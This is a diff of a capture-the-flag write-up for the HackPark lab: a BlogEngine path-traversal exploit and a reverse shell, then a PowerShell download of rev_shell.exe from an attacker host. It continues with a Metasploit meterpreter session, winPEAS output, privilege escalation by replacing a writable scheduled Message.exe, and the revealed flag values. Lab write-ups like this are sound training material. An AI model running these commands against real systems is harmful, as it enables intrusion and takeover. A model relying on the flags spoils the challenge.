@@ -135,7 +135,7 @@ After that we should upload the script using blogengine control panel:
 3. Go to "*Welcome to HackPark*"
 4. In the text editor press the button "*File Manager*" and upload the PostView.ascx
 
-Finally, go to `http://10.10.10.10/?theme=../../App_Data/files`. If everything done right, we recieve the connection.
+Finally, go to `http://10.10.29.8:80?theme=../../App_Data/files`. If everything done right, we recieve the connection.
 
 ```console
 vladislav@Mac Downloads % netcat -nlvp 4445
@@ -173,7 +173,7 @@ powershell -c Invoke-WebRequest -uri "http://10.18.7.222:8000/rev_shell.exe" -ou
 
 Next, we need to setup a Metasploit TCP Reverse Shell:
 
-```bash
+```console
 msf6 > use multi/handler
 msf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp
 msf6 exploit(multi/handler) > set LHOST 10.18.7.222
@@ -184,13 +184,13 @@ msf6 exploit(multi/handler) > exploit
 ```
 
 Run the uploaded script on the target machine:
-```
+```console
 cd \windows\temp
 .\rev_shell.exe
 ```
 
 If everything done right, we get the meterpreter reverse TCP session:
-```bash
+```console
 [*] Started reverse TCP handler on 10.18.7.222:4446 
 [*] Sending stage (175686 bytes) to 10.10.29.8
 [*] Meterpreter session 1 opened (10.18.7.222:4446 -> 10.10.29.8:49264) at 2022-09-29 16:32:08 +0300
@@ -211,17 +211,339 @@ wget https://raw.githubusercontent.com/carlospolop/PEASS-ng/master/winPEAS/winPE
 ```
 
 On the meterpreter session:
-```bash
+```console
 meterpreter > upload winPEAS.bat c:\\windows\\temp
 [*] uploading  : /Users/vladislav/winPEAS.bat -> c:\windows\temp
 [*] uploaded   : /Users/vladislav/winPEAS.bat -> c:\windows\temp\winPEAS.bat
 ```
 
 Run the script:
-```bash
+```console
 c:\Windows\Temp>.\winPEAS.bat
+.\winPEAS.bat
+
+ Volume in drive C has no label.
+ Volume Serial Number is 0E97-C552
+ Volume in drive C has no label.
+ Volume Serial Number is 0E97-C552
+ Volume in drive C has no label.
+ Volume Serial Number is 0E97-C552
+ Volume in drive C has no label.
+ Volume Serial Number is 0E97-C552
+
+ [+] GPP Password
+
+ [+] Cloud Credentials
+
+ [+] AppCmd
+   [?] https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#appcmd-exe
+C:\Windows\system32\inetsrv\appcmd.exe exists. 
+
+ [+] Files in registry that may contain credentials
+   [i] Searching specific files that may contains credentials.
+   [?] https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#credentials-inside-files
+Looking inside HKCU\Software\ORL\WinVNC3\Password
+Looking inside HKEY_LOCAL_MACHINE\SOFTWARE\RealVNC\WinVNC4/password
+Looking inside HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\WinLogon
+    DefaultDomainName    REG_SZ    
+    DefaultUserName    REG_SZ    
+Looking inside HKLM\SYSTEM\CurrentControlSet\Services\SNMP
+
+HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\SNMP\Parameters
+
+HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\SNMP\Parameters\ExtensionAgents
+    W3SVC    REG_SZ    Software\Microsoft\W3SVC\CurrentVersion
+
+Looking inside HKCU\Software\TightVNC\Server
+Looking inside HKCU\Software\SimonTatham\PuTTY\Sessions
+Looking inside HKCU\Software\OpenSSH\Agent\Keys
+C:\ProgramData\Amazon\EC2-Windows\Launch\Sysprep\Unattend.xml
+C:\ProgramData\Amazon\EC2Launch\sysprep\unattend.xml
+C:\Users\All Users\Amazon\EC2-Windows\Launch\Sysprep\Unattend.xml
+C:\Users\All Users\Amazon\EC2Launch\sysprep\unattend.xml
+C:\Windows\Panther\setupinfo
+C:\Windows\System32\inetsrv\appcmd.exe
+C:\Windows\SysWOW64\inetsrv\appcmd.exe
+C:\Windows\WinSxS\amd64_ipamprov-dhcp_31bf3856ad364e35_6.3.9600.16384_none_64e8a179c6f2a167\ScheduledTasks.xml
+C:\Windows\WinSxS\amd64_ipamprov-dns_31bf3856ad364e35_6.3.9600.16384_none_824aabe06aee1705\ScheduledTasks.xml
+C:\Windows\WinSxS\amd64_microsoft-windows-d..rvices-domain-files_31bf3856ad364e35_6.3.9600.16384_none_8bc96e4517571480\ntds.dit
+C:\Windows\WinSxS\amd64_microsoft-windows-iis-sharedlibraries_31bf3856ad364e35_6.3.9600.16384_none_01a7d2cf88c95dc0\appcmd.exe
+C:\Windows\WinSxS\amd64_microsoft-windows-iis-sharedlibraries_31bf3856ad364e35_6.3.9600.17031_none_01dac51388a3a832\appcmd.exe
+C:\Windows\WinSxS\amd64_microsoft-windows-webenroll.resources_31bf3856ad364e35_6.3.9600.16384_en-us_7427d216367d8d3f\certnew.cer
+C:\Windows\WinSxS\wow64_ipamprov-dhcp_31bf3856ad364e35_6.3.9600.16384_none_6f3d4bcbfb536362\ScheduledTasks.xml
+C:\Windows\WinSxS\wow64_ipamprov-dns_31bf3856ad364e35_6.3.9600.16384_none_8c9f56329f4ed900\ScheduledTasks.xml
+C:\Windows\WinSxS\wow64_microsoft-windows-iis-sharedlibraries_31bf3856ad364e35_6.3.9600.16384_none_0bfc7d21bd2a1fbb\appcmd.exe
+C:\Windows\WinSxS\wow64_microsoft-windows-iis-sharedlibraries_31bf3856ad364e35_6.3.9600.17031_none_0c2f6f65bd046a2d\appcmd.exe
+C:\inetpub\wwwroot\Web.config
+C:\inetpub\wwwroot\Account\Web.Config
+C:\inetpub\wwwroot\admin\Web.Config
+C:\inetpub\wwwroot\admin\app\editor\Web.Config
+C:\inetpub\wwwroot\setup\Web.config
+
+---
+Scan complete.
+    
+     ,/*,..*(((((((((((((((((((((((((((((((((,
+
+   ,*/((((((((((((((((((/,  .*//((//**, .*((((((*
+PowerShell v2 Version:
+
+HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\PowerShell\1\PowerShellEngine
+    PowerShellVersion    REG_SZ    2.0
+
+PowerShell v5 Version:
+
+HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\PowerShell\3\PowerShellEngine
+    PowerShellVersion    REG_SZ    4.0
+
+Transcriptions Settings:
+Module logging settings:
+Scriptblog logging settings:
+
+PS default transcript history
+
+Checking PS history file
+
+ [+] MOUNTED DISKS
+   [i] Maybe you find something interesting
+Caption  
+C:       
+
+
+
+ [+] ENVIRONMENT
+   [i] Interesting information?
+
+ALLUSERSPROFILE=C:\ProgramData
+CommonProgramFiles=C:\Program Files (x86)\Common Files
+CommonProgramFiles(x86)=C:\Program Files (x86)\Common Files
+CommonProgramW6432=C:\Program Files\Common Files
+COMPUTERNAME=HACKPARK
+ComSpec=C:\Windows\system32\cmd.exe
+CurrentLine= 0x1B[33m[+]0x1B[97m ENVIRONMENT
+E=0x1B[
+FP_NO_HOST_CHECK=NO
+long=false
+NUMBER_OF_PROCESSORS=2
+OS=Windows_NT
+Path=C:\Windows\system32;C:\Windows;C:\Windows\System32\Wbem;C:\Windows\System32\WindowsPowerShell\v1.0\
+PATHEXT=.COM;.EXE;.BAT;.CMD;.VBS;.VBE;.JS;.JSE;.WSF;.WSH;.MSC
+Percentage=1
+PercentageTrack=30
+PROCESSOR_ARCHITECTURE=x86
+PROCESSOR_ARCHITEW6432=AMD64
+PROCESSOR_IDENTIFIER=Intel64 Family 6 Model 79 Stepping 1, GenuineIntel
+PROCESSOR_LEVEL=6
+PROCESSOR_REVISION=4f01
+ProgramData=C:\ProgramData
+ProgramFiles=C:\Program Files (x86)
+ProgramFiles(x86)=C:\Program Files (x86)
+ProgramW6432=C:\Program Files
+PROMPT=$P$G
+PSModulePath=C:\Windows\system32\WindowsPowerShell\v1.0\Modules\
+PUBLIC=C:\Users\Public
+SystemDrive=C:
+SystemRoot=C:\Windows
+TEMP=C:\Windows\TEMP
+TMP=C:\Windows\TEMP
+USERDOMAIN=IIS APPPOOL
+USERNAME=Blog
+USERPROFILE=C:\Users\Default
+windir=C:\Windows
+
+ [+] INSTALLED SOFTWARE
+   [i] Some weird software? Check for vulnerabilities in unknow software installed
+   [?] https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#software
+
+Amazon
+Common Files
+Common Files
+Internet Explorer
+Internet Explorer
+Microsoft.NET
+SystemScheduler
+Windows Mail
+Windows Mail
+Windows NT
+Windows NT
+WindowsPowerShell
+WindowsPowerShell
+    InstallLocation    REG_SZ    C:\Program Files (x86)\SystemScheduler\
+    InstallLocation    REG_SZ    C:\Program Files (x86)\SystemScheduler\
+
+Looking inside HKCU\Software\OpenSSH\Agent\Keys
+
+
+
+
+
+C:\ProgramData\Amazon\EC2-Windows\Launch\Sysprep\Unattend.xml
+C:\ProgramData\Amazon\EC2Launch\sysprep\unattend.xml
+C:\Users\All Users\Amazon\EC2-Windows\Launch\Sysprep\Unattend.xml
+C:\Users\All Users\Amazon\EC2Launch\sysprep\unattend.xml
+C:\Windows\Panther\setupinfo
+C:\Windows\System32\inetsrv\appcmd.exe
+C:\Windows\SysWOW64\inetsrv\appcmd.exe
+C:\Windows\WinSxS\amd64_ipamprov-dhcp_31bf3856ad364e35_6.3.9600.16384_none_64e8a179c6f2a167\ScheduledTasks.xml
+C:\Windows\WinSxS\amd64_ipamprov-dns_31bf3856ad364e35_6.3.9600.16384_none_824aabe06aee1705\ScheduledTasks.xml
+C:\Windows\WinSxS\amd64_microsoft-windows-d..rvices-domain-files_31bf3856ad364e35_6.3.9600.16384_none_8bc96e4517571480\ntds.dit
+C:\Windows\WinSxS\amd64_microsoft-windows-iis-sharedlibraries_31bf3856ad364e35_6.3.9600.16384_none_01a7d2cf88c95dc0\appcmd.exe
+C:\Windows\WinSxS\amd64_microsoft-windows-iis-sharedlibraries_31bf3856ad364e35_6.3.9600.17031_none_01dac51388a3a832\appcmd.exe
+C:\Windows\WinSxS\amd64_microsoft-windows-webenroll.resources_31bf3856ad364e35_6.3.9600.16384_en-us_7427d216367d8d3f\certnew.cer
+C:\Windows\WinSxS\wow64_ipamprov-dhcp_31bf3856ad364e35_6.3.9600.16384_none_6f3d4bcbfb536362\ScheduledTasks.xml
+C:\Windows\WinSxS\wow64_ipamprov-dns_31bf3856ad364e35_6.3.9600.16384_none_8c9f56329f4ed900\ScheduledTasks.xml
+C:\Windows\WinSxS\wow64_microsoft-windows-iis-sharedlibraries_31bf3856ad364e35_6.3.9600.16384_none_0bfc7d21bd2a1fbb\appcmd.exe
+C:\Windows\WinSxS\wow64_microsoft-windows-iis-sharedlibraries_31bf3856ad364e35_6.3.9600.17031_none_0c2f6f65bd046a2d\appcmd.exe
+C:\inetpub\wwwroot\Web.config
+C:\inetpub\wwwroot\Account\Web.Config
+C:\inetpub\wwwroot\admin\Web.Config
+C:\inetpub\wwwroot\admin\app\editor\Web.Config
+C:\inetpub\wwwroot\setup\Web.config
+
+---
+Scan complete.
+ [+] Remote Desktop Credentials Manager
+   [?] https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#remote-desktop-credential-manager
+
+
+Looking inside \Microsoft\Credentials\
+
+
+ [+] Unattended files
+
+ [+] SAM and SYSTEM backups
+
+ [+] McAffee SiteList.xml
+ Volume in drive C has no label.
+ Volume Serial Number is 0E97-C552
+ Volume in drive C has no label.
+ Volume Serial Number is 0E97-C552
+ Volume in drive C has no label.
+ Volume Serial Number is 0E97-C552
+ Volume in drive C has no label.
+ Volume Serial Number is 0E97-C552
+
+ [+] GPP Password
+
+ [+] Cloud Credentials
 ```
 
-***
+However, it doesn't give us some useful information.
 
-## <strong><font color="#34A5DA">Privilege Escalation Without Metasploit</font></strong>
+```console
+meterpreter > ps
+
+Process List
+============
+
+ PID   PPID  Name                  Arch  Session  User              Path
+ ---   ----  ----                  ----  -------  ----              ----
+ 0     0     [System Process]
+ 4     0     System
+ 68    680   svchost.exe
+ 368   4     smss.exe
+ 488   2084  findstr.exe           x64   0        IIS APPPOOL\Blog  C:\Windows\System32\findstr.exe
+ 524   516   csrss.exe
+ 580   572   csrss.exe
+ 588   516   wininit.exe
+ 616   572   winlogon.exe
+ 680   588   services.exe
+ 688   588   lsass.exe
+ 748   680   svchost.exe
+ 756   2560  rev_shell.exe         x86   0        IIS APPPOOL\Blog  c:\Windows\Temp\rev_shell.exe
+ 792   680   svchost.exe
+ 868   680   svchost.exe
+ 884   680   svchost.exe
+ 888   616   dwm.exe
+ 912   680   svchost.exe
+ 964   680   svchost.exe
+ 1108  680   svchost.exe
+ 1136  680   spoolsv.exe
+ 1168  680   amazon-ssm-agent.exe
+ 1244  680   svchost.exe
+ 1264  680   LiteAgent.exe
+ 1364  680   svchost.exe
+ 1380  680   svchost.exe
+ 1408  680   WService.exe
+ 1456  2560  conhost.exe           x64   0        IIS APPPOOL\Blog  C:\Windows\System32\conhost.exe
+ 1544  1408  WScheduler.exe
+ 1640  680   Ec2Config.exe
+ 1732  748   WmiPrvSE.exe
+ 1836  2084  cmd.exe               x64   0        IIS APPPOOL\Blog  C:\Windows\System32\cmd.exe
+ 1876  2084  conhost.exe           x64   0        IIS APPPOOL\Blog  C:\Windows\System32\conhost.exe
+ 2084  2792  cmd.exe               x64   0        IIS APPPOOL\Blog  C:\Windows\System32\cmd.exe
+ 2088  2484  conhost.exe           x64   0        IIS APPPOOL\Blog  C:\Windows\System32\conhost.exe
+ 2092  2488  Message.exe
+ 2428  680   msdtc.exe
+ 2484  2792  cmd.exe               x64   0        IIS APPPOOL\Blog  C:\Windows\System32\cmd.exe
+ 2488  2188  WScheduler.exe
+ 2504  912   taskhostex.exe
+ 2560  2792  cmd.exe               x64   0        IIS APPPOOL\Blog  C:\Windows\System32\cmd.exe
+ 2580  2572  explorer.exe
+ 2676  748   WmiPrvSE.exe
+ 2792  1380  w3wp.exe              x64   0        IIS APPPOOL\Blog  C:\Windows\System32\inetsrv\w3wp.exe
+ 3032  2528  ServerManager.exe
+```
+
+Here we can see two interesting processes: WService.exe and WScheduler.exe. Let's take a look at scheduler:
+
+```
+meterpreter > cd "Program Files (x86)"
+meterpreter > cd SystemScheduler
+meterpreter > cd Events
+```
+
+Here we can see a file called `20198415519.INI_LOG.txt`. It contains the following information:
+```
+...
+09/29/22 07:10:05,Event Started Ok, (Administrator)
+09/29/22 07:10:38,Process Ended. PID:2224,ExitCode:4,Message.exe (Administrator)
+09/29/22 07:11:03,Event Started Ok, (Administrator)
+09/29/22 07:11:35,Process Ended. PID:2092,ExitCode:4,Message.exe (Administrator)
+09/29/22 07:12:05,Event Started Ok, (Administrator)
+09/29/22 07:12:35,Process Ended. PID:2896,ExitCode:4,Message.exe (Administrator)
+09/29/22 07:13:03,Event Started Ok, (Administrator)
+09/29/22 07:13:34,Process Ended. PID:1964,ExitCode:4,Message.exe (Administrator)
+09/29/22 07:14:03,Event Started Ok, (Administrator)
+09/29/22 07:14:33,Process Ended. PID:2588,ExitCode:4,Message.exe (Administrator)
+09/29/22 07:15:01,Event Started Ok, (Administrator)
+09/29/22 07:15:33,Process Ended. PID:2212,ExitCode:4,Message.exe (Administrator)
+09/29/22 07:16:01,Event Started Ok, (Administrator)
+09/29/22 07:16:34,Process Ended. PID:2752,ExitCode:4,Message.exe (Administrator)
+09/29/22 07:17:02,Event Started Ok, (Administrator)
+...
+```
+
+As we can see, Windows Scheduler starts `Message.exe` every 30 seconds.
+
+And fortunately we have all permissions for this file:
+```
+meterpreter > ls
+Listing: c:\Program Files (x86)\SystemScheduler
+===============================================
+
+Mode              Size     Type  Last modified              Name
+----              ----     ----  -------------              ----
+...
+100777/rwxrwxrwx  536992   fil   2018-03-25 20:58:56 +0300  Message.exe
+...
+```
+
+Change the original `Message.exe` to our `rev_shell.exe`:
+
+```
+meterpreter > mv /windows/temp/rev_shell.exe "c:\Program Files (x86)\SystemScheduler\rev_shell.exe"
+meterpreter > mv Message.exe Message.f
+meterpreter > mv rev_shell.exe Message.exe
+```
+
+Reload reverse TCP handler. And finally we get Administrator's privileges:
+
+```console
+meterpreter > getuid
+Server username: HACKPARK\Administrator
+```
+
+Now we can find user.txt on Jeff's Desktop containing: `759bd8af507517bcfaede78a21a73e39`.
+
+Also, the root flag on Administrator's Desktop which contains: `7e13d97f05f7ceb9881a3eb3d78d3e72`.
